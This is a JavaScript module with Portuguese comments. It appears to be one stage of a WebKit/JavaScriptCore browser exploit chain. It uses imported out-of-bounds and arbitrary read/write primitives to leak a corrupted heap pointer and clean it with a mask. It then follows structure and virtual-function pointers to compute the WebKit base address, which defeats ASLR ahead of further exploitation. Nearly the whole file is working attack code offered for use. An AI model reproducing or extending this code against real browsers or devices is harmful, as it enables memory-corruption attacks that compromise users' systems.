// js/script3/UltimateExploit.mjs (R63.1 - Correção de Bitwise AND e Validação)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    arb_read,
    arb_write,
    oob_read_absolute,
    oob_write_absolute,
    isOOBReady
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_ULTIMATE = "Ultimate_Exploit_R63_Infoleak";

function isValidPointer(ptr) {
    if (!ptr || !isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high();
    if (high < 0x1000) return false;
    if ((high & 0x7FF00000) === 0x7FF00000) return false;
    return true;
}

// --- Funções da Cadeia de Exploit ---

// 1. Replica a vulnerabilidade de infoleak do log
async function get_infoleak_address() {
    logS3("[Infoleak] Replicando a técnica de vazamento de ponteiro...", "subtest");
    
    const OOB_WRITE_OFFSET = 160;
    const OOB_WRITE_VAL = 0xEE;
    const OOB_READ_OFFSET = 156;

    await triggerOOB_primitive({ force_reinit: true });
    if (!isOOBReady()) throw new Error("Falha na inicialização do ambiente OOB para o infoleak.");

    oob_write_absolute(OOB_WRITE_OFFSET, OOB_WRITE_VAL, 1);
    const leaked_ptr = oob_read_absolute(OOB_READ_OFFSET, 8);

    if (leaked_ptr.low() === 0 && leaked_ptr.high() === 0) {
        throw new Error("O vazamento de informação falhou. O ponteiro lido é nulo.");
    }

    logS3(`[Infoleak] Ponteiro corrompido vazado com sucesso: ${leaked_ptr.toString(true)}`, "vuln");
    return leaked_ptr;
}

// 2. "Limpa" o ponteiro corrompido para torná-lo um endereço válido
function clean_leaked_address(corrupted_ptr) {
    logS3("[Infoleak] Limpando o ponteiro vazado...", "subtest");
    
    // CORREÇÃO: Realizamos a operação AND manualmente nas partes low/high.
    // Esta máscara assume que o byte 'EE' corrompeu o byte menos significativo da parte 'high' do endereço.
    // Ex: 0xAAAAAAEE & 0xFFFFFF00 = 0xAAAAAA00
    const mask_low = 0xFFFFFFFF; // Não mexe na parte baixa
    const mask_high = 0xFFFFFF00; // Zera o último byte da parte alta

    const cleaned_low = corrupted_ptr.low() & mask_low;
    const cleaned_high = corrupted_ptr.high() & mask_high;
    const cleaned_ptr = new AdvancedInt64(cleaned_low, cleaned_high);
    
    logS3(`[Infoleak] Ponteiro limpo e pronto para uso: ${cleaned_ptr.toString(true)}`, "good");
    return cleaned_ptr;
}

// --- Função Principal do Exploit ---
export async function executeInfoleakExploit_R63() {
    let final_result = { success: false, message: "Falha ao iniciar." };
    try {
        // Estágio 1: Obter o ponteiro inicial via Infoleak
        const corrupted_ptr = await get_infoleak_address();
        
        // Validação crucial: o ponteiro vazado deve parecer um ponteiro
        if (corrupted_ptr.high() === 0) {
             throw new Error(`O ponteiro vazado (${corrupted_ptr.toString(true)}) não parece um endereço de heap válido.`);
        }
        
        const initial_heap_ptr = clean_leaked_address(corrupted_ptr);
        if (!isValidPointer(initial_heap_ptr)) {
            throw new Error(`O ponteiro limpo (${initial_heap_ptr.toString(true)}) é inválido.`);
        }

        // Estágio 2: Usar o ponteiro para vazar a base do WebKit
        logS3("--- Usando o ponteiro vazado para obter a base do WebKit ---", "subtest");

        const p_structure = await arb_read(initial_heap_ptr, 8, JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
        if(!isValidPointer(p_structure)) throw new Error(`Ponteiro da Estrutura inválido: ${p_structure.toString(true)}`);
        logS3(`Ponteiro da Estrutura: ${p_structure.toString(true)}`, 'leak');

        const p_virtual_put_func = await arb_read(p_structure, 8, JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
        if(!isValidPointer(p_virtual_put_func)) throw new Error(`Ponteiro da Função Virtual inválido: ${p_virtual_put_func.toString(true)}`);
        logS3(`Ponteiro da Função Virtual (put): ${p_virtual_put_func.toString(true)}`, 'leak');

        const webkit_base = p_virtual_put_func.and(new AdvancedInt64(0x0, ~0xFFF)); // Usar .and() aqui é seguro, pois é na nossa classe
        
        const success_msg = `Base do WebKit vazada com sucesso: ${webkit_base.toString(true)}`;
        logS3(success_msg, "vuln_major");
        
        final_result.success = true;
        final_result.message = success_msg;
        
    } catch (e) {
        logS3(`ERRO CRÍTICO: ${e.message}`, "critical");
        console.error(e);
        final_result.error = e.message;
    }
    return final_result;
}
